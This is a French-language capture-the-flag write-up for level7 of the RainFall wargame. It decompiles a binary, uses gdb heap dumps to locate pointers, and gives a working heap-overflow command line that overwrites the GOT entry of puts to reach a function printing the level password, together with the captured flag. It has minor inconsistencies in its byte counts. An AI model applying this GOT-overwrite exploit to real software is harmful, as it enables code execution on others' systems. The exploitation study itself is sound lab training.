Read also: [./Resources/README.md](./Resources/README.md)

# Source

https://dogbolt.org/?id=41a50d3a-4820-48a6-93d8-d314911b1399#Ghidra=187&BinaryNinja=163

```c
int m()
{
  // 0x08049960  c
  return printf("%s - %d\n", &c, time(nullptr));
}

typedef struct struct_0 {
  unsigned int value;
  char *ptr;
} struct_0;

int main(int argc, char** argv, char** envp)
{
  struct_0 *v0;
  struct_0 *v1;

  v0 = malloc(8);
  v0->value = 1;
  v0->ptr = malloc(8);
  v1 = malloc(8);
  v1->value = 2;
  v1->ptr = malloc(8);
  strcpy(v0->ptr, argv[1]);
  strcpy(v1->ptr, argv[2]);
  fgets(&c, 0x44, fopen("/home/user/level8/.pass", "r"));
  puts("~~");
  return 0;
}
```

# Explication

Ce qu‚Äôon souhaite faire ici c‚Äôest utiliser strcpy pour modifier une variable.

Avec le premier strdup, on peut faire un buffer overflow pour changer l‚Äôadresse de ‚Äúv1->ptr‚Äù et donc avec le
deuxi√®me strdup on change la valeur souhait√© üòÄ (donn√© par le premier argument pass√©)

Adresse de la fonction m:

```
(gdb) p m
$10 = 0x80484f4 <m>
```

Adresse de puts dans la GOT (Global Offset Table) :

```
level7@RainFall:~$ objdump --dynamic-reloc level7

level7:   file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE           VALUE
‚Ä¶
08049928 R_386_JUMP_SLOT   puts
‚Ä¶
```

On regarde la position de chacune des variables:

```
(gdb) b fgets
‚Ä¶
(gdb) run aaa bbb
‚Ä¶
(gdb) x/20xb _GLOBAL_OFFSET_TABLE_
‚Ä¶
{{{Plein de fois entr√©e}}}
‚Ä¶
(gdb)
0x8049ff8:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x804a000:    0x00    0x00    0x00    0x00    0x11    0x00    0x00    0x00
0x804a008:    0x01    0x00    0x00    0x00
(gdb)
0x804a00c:    0x18    0xa0    0x04    0x08    0x00    0x00    0x00    0x00
0x804a014:    0x11    0x00    0x00    0x00    0x61    0x61    0x61    0x00
                                              ^^^^    ^^^^    ^^^^
0x804a01c:    0x00    0x00    0x00    0x00
(gdb)
0x804a020:    0x00    0x00    0x00    0x00    0x11    0x00    0x00    0x00
0x804a028:    0x02    0x00    0x00    0x00    0x38    0xa0    0x04    0x08
0x804a030:    0x00    0x00    0x00    0x00
(gdb)
0x804a034:    0x11    0x00    0x00    0x00    0x62    0x62    0x62    0x00
                                              ^^^^    ^^^^    ^^^^
0x804a03c:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x804a044:    0xc1    0x0f    0x02    0x00
(gdb)
0x804a048:    0x0c    0x24    0xad    0xfb    0x00    0x00    0x00    0x00
0x804a050:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x804a058:    0x00    0x00    0x00    0x00
```

Checking :

```
(gdb) b strcpy
‚Ä¶
(gdb) run aaa bbb
‚Ä¶
(gdb) continue
‚Ä¶
(gdb) x/40xb 0x804a014
0x804a014:    0x11    0x00    0x00    0x00    0x61    0x61    0x61    0x00
                                              ^^^^    ^^^^    ^^^^
0x804a01c:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x804a024:    0x11    0x00    0x00    0x00    0x02    0x00    0x00    0x00
0x804a02c:    0x38    0xa0    0x04    0x08    0x00    0x00    0x00    0x00
              ^^^^    ^^^^    ^^^^    ^^^^
0x804a034:    0x11    0x00    0x00    0x00    0x62    0x62    0x62    0x00
                                              ^^^^    ^^^^    ^^^^
```

Il faut 20 caract√®re (0x20 => 32) pour modifier `0x38 0xa0 0x04 0x08`.

Trying :

```
(gdb) b strcpy
‚Ä¶
(gdb) run $(python -c "print('a' * 32 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
‚Ä¶
(gdb) continue
‚Ä¶
(gdb) x/40xb 0x804a014
0x804a014:    0x11    0x00    0x00    0x00    0x61    0x61    0x61    0x61
0x804a01c:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x804a024:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x804a02c:    0x28    0x99    0x04    0x08    0x00    0x00    0x00    0x00
              ^^^^    ^^^^    ^^^^    ^^^^
0x804a034:    0x11    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

On obtient :

```
level7@RainFall:~$ ./level7 $(python -c 'print("a" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1716181706
```
